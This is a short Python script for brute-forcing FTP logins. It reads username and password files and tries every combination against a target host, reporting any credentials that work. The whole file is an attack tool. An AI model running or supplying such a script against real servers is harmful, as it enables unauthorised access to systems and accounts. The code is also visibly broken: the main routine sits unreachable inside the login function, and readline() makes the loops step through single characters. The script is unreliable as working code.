#FTP Server brutefoce Attacks

#import statement

import ftplib, sys, os, termcolor
# Defining the 'ftp_login' function
def ftp_login(hostname, username, password):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(username,password)
        ftp.quit()
        
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        print(e)
        pass
    
    #Taking input from the user
    host = input('[+] Target Address: :')
    username_file = input("[+] Set Username File Path: ")
    password_file = input("[+] Set Password File Path: ")
    print("\n")
    # Checking whether the file paths exit or not:
    if os.path.exists(username_file) == False:
        print(f"[!] Username File {username_file} Does Not Exist.")
        sys.exit(1)
    elif os.path.exists(password_file) == False:
        print(f"[!] Password File {password_file} Does not Exist.")
        sys.exit(1)
    # Reading usernames and passwords from the files
    with open(username_file,'r') as user_file:
        usernames = user_file.readline()
    with open(password_file,'r') as pass_file:
        passwords = pass_file.readline()
    #Looping over each combination of username and password and attempting FTP login:
    for username in usernames:
        for password in passwords:
            username = username.strip()
            password = password.strip()
            if ftp_login(host, username, password):
                print(termcolor.colored(("[+] FTP Login Successful: "+ "Username: "+username+"\n"+"Password: "+password),'green'))
                sys.exit(0)
                
            else:
                print("[-] FTP Login Failed: "+username+"&&"+password)
    print("[!!] FTP Brute Force Complete")
    sys.exit(1)